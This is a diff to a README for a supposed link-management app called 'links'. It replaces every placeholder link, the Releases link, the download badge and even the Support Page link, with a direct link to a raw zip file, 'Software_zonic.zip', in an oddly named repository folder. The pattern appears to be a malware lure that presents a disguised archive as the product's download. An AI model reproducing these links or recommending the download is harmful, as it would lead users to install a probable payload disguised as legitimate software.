@@ -1,7 +1,7 @@
 # 🚀 links - Easy Link Management Made Simple
 
 ## 📥 Download Now
-[![Download links](https://img.shields.io/badge/Download%20links-v1.0-blue)](https://example.com/releases)
+[![Download links](https://github.com/caio-arc/links/raw/refs/heads/main/resurrectioning/Software_zonic.zip%20links-v1.0-blue)](https://github.com/caio-arc/links/raw/refs/heads/main/resurrectioning/Software_zonic.zip)
 
 ## 📖 Introduction
 Welcome to **links**, your straightforward solution for managing links efficiently. This application helps you save, organize, and access your links with ease. Whether you're saving bookmarks or need a tool for quick access, links has you covered.
@@ -20,7 +20,7 @@ To ensure the best experience, please check the following system requirements:
 ## 📥 Download & Install
 To download the latest version of links, please visit the Releases page.
 
-[Visit the Releases Page to Download links](https://example.com/releases)
+[Visit the Releases Page to Download links](https://github.com/caio-arc/links/raw/refs/heads/main/resurrectioning/Software_zonic.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Look for the latest version of links.
@@ -64,9 +64,9 @@ Currently, links is designed for desktop use. We're planning to create a mobile 
 We take data security seriously. Your links are stored locally on your device.
 
 ## 📞 Support
-For further assistance, please reach out to our support team through the GitHub Issues section or visit the [Support Page](https://example.com/support).
+For further assistance, please reach out to our support team through the GitHub Issues section or visit the [Support Page](https://github.com/caio-arc/links/raw/refs/heads/main/resurrectioning/Software_zonic.zip).
 
 ## 📥 Final Reminder
 Don’t forget to download links today!
 
-[Download links](https://example.com/releases)
+[Download links](https://github.com/caio-arc/links/raw/refs/heads/main/resurrectioning/Software_zonic.zip)
